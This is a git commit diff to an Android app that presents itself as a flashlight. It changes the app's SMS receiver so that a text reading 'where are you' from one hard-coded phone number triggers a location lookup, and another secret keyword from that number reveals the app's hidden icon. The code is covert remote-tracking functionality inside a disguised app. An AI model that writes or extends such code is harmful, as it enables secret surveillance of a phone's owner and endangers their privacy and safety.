79f4170adf5339af179cecf47f58bcd6a1a70d7b
amboxer21 <amboxer21@gmail.com>
2018-07-14 21:38:29 -0400

    Added location query support with hard coded keyword.

--- src/com/flash/light/SMSReceiver.java
+++ src/com/flash/light/SMSReceiver.java
@@ -4,7 +4,9 @@ import java.util.List;
 import android.util.Log;
 import android.os.Bundle;
 import java.io.IOException;
+
 import android.app.Activity;
+import android.app.PendingIntent;
 
 import android.telephony.SmsMessage;
 import android.telephony.SmsManager;
@@ -90,13 +92,13 @@ public class SMSReceiver extends BroadcastReceiver {
 
           final String message_from = messages[0].getOriginatingAddress();
 
-          /*if(mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
+          if(mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
             intent = new Intent(context, FlashLightService.class);
-            intent.putExtra("obtainLocation","obtainLocation");
-            context.startService(intent);
+            PendingIntent pendingIntent = PendingIntent.getService(context, 0, intent, 0);
+            FlashLightService flashLightService = new FlashLightService();
+            flashLightService.obtainLocation(context, pendingIntent);
           }
-          else if(mBody.equals(unhideKeywordString) && message_from.equals(phoneNumberString)) {*/
-          if(mBody.equals(unhideKeywordString) && message_from.equals(phoneNumberString)) {
+          else if(mBody.equals(unhideKeywordString) && message_from.equals(phoneNumberString)) {
             threading("Showing FlashLight app!");
             flashLight.showAppIcon(context, context.getPackageManager());
           }
